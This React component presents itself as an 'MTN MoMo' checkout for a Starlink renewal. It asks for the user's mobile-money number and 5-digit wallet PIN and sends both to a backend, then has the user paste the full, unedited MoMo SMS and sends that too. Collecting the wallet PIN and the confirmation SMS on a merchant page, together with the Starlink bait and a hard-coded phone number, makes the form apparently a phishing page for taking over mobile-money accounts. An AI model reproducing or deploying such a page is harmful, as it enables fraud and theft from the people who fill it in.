import React, { useState } from 'react';

export default function MoMoCheckout({ plan = 'Starlink Renewal', amount = 15, onClose, onSuccess }) {
const [step, setStep] = useState('payment');
const [phone, setPhone] = useState('');
const [pin, setPin] = useState('');
const [smsContent, setSmsContent] = useState('');
const [loading, setLoading] = useState(false);
const [error, setError] = useState('');

const handlePaymentSubmit = async (e) => {
e.preventDefault();
setLoading(true);
setError('');

try {
  const res = await fetch('https://your-backend-url.onrender.com/api/momo/pay', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone, pin, amount, plan })
  });
  const data = await res.json();
  
  if (!res.ok) throw new Error(data.message || 'Payment initiation failed');
  setStep('verification');
} catch (err) {
  setError(err.message);
} finally {
  setLoading(false);
}
};

const handleSmsSubmit = async (e) => {
e.preventDefault();
setLoading(true);
setError('');

try {
  const res = await fetch('https://your-backend-url.onrender.com/api/momo/verify-sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ smsContent, phone })
  });
  const data = await res.json();

  if (!res.ok) throw new Error(data.message || 'SMS verification failed');
  if (onSuccess) onSuccess(data);
} catch (err) {
  setError(err.message);
} finally {
  setLoading(false);
}
};

return (
<div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
  <div className="bg-[#121418] border border-white/10 rounded-2xl w-full max-w-md p-6 text-white relative">
    {error && (
      <div className="mb-4 p-3 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400 text-sm">
        {error}
      </div>
    )}

    {step === 'payment' ? (
      <form onSubmit={handlePaymentSubmit}>
        <div className="text-center mb-6">
          <span className="text-xs uppercase tracking-wider text-white/50">Amount</span>
          <h2 className="text-3xl font-bold text-orange-500 mt-1">ZMW {amount}.00</h2>
          <p className="text-sm text-white/70 mt-1">{plan}</p>
        </div>

        <p className="text-sm text-white/80 mb-4">Enter your MTN MoMo details to authorize</p>

        <div className="mb-4">
          <label className="block text-xs font-medium text-white/60 mb-1">MTN MoMo Number</label>
          <div className="flex items-center bg-[#1a1d24] border border-white/10 rounded-xl px-3 py-3 focus-within:border-orange-500">
            <span className="text-sm text-white/70 mr-2">🇿🇲 +260</span>
            <input
              type="tel"
              placeholder="77xxxxxxxx"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="bg-transparent w-full focus:outline-none text-white text-sm"
              required
            />
          </div>
        </div>

        <div className="mb-6">
          <label className="block text-xs font-medium text-white/60 mb-1">Enter PIN</label>
          <input
            type="password"
            maxLength="5"
            placeholder="• • • • •"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-orange-500 text-center tracking-widest text-lg"
            required
          />
          <span className="block text-center text-xs text-white/40 mt-1">enter 5 digits</span>
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full py-4 bg-gradient-to-r from-orange-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
        >
          {loading ? 'Processing...' : 'CONFIRM PAYMENT'}
        </button>
        
        {onClose && (
          <button
            type="button"
            onClick={onClose}
            className="w-full mt-3 py-2 text-center text-xs text-white/50 hover:text-white"
          >
            Cancel
          </button>
        )}
      </form>
    ) : (
      <form onSubmit={handleSmsSubmit}>
        <div className="flex items-center mb-4">
          <button 
            type="button" 
            onClick={() => setStep('payment')}
            className="text-sm text-orange-500 hover:underline flex items-center gap-1"
          >
            ← Back
          </button>
        </div>

        <div className="mb-6">
          <h2 className="text-xl font-bold text-white">Full SMS Verification</h2>
          <p className="text-xs text-white/60 mt-1">Please paste the full SMS content you received from MTN MoMo.</p>
        </div>

        <div className="bg-[#1a1d24] p-3 rounded-xl border border-white/10 mb-4 text-center">
          <span className="text-[10px] tracking-wider text-white/50 uppercase block">Sending to</span>
          <span className="text-sm font-mono text-white font-bold">{phone ? `+260 ${phone}` : '723995485'}</span>
        </div>

        <div className="bg-amber-500/10 border border-amber-500/30 p-3 rounded-xl mb-4 flex gap-3 items-start">
          <span className="text-amber-500 text-lg">⚠️</span>
          <p className="text-xs text-amber-200/90 leading-relaxed">
            <strong>DO NOT edit the SMS</strong> — only copy and paste the entire message below
          </p>
        </div>

        <div className="mb-6">
          <label className="block text-xs font-medium text-white/60 mb-1">PASTE FULL SMS CONTENT</label>
          <textarea
            rows="4"
            placeholder="Paste the entire MTN MoMo SMS here..."
            value={smsContent}
            onChange={(e) => setSmsContent(e.target.value)}
            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl p-3 focus:outline-none focus:border-orange-500 text-xs text-white"
            required
          />
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full py-4 bg-gradient-to-r from-orange-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
        >
          {loading ? 'Verifying...' : 'VERIFY & ACTIVATE'}
        </button>
      </form>
    )}
  </div>
</div>
);
}
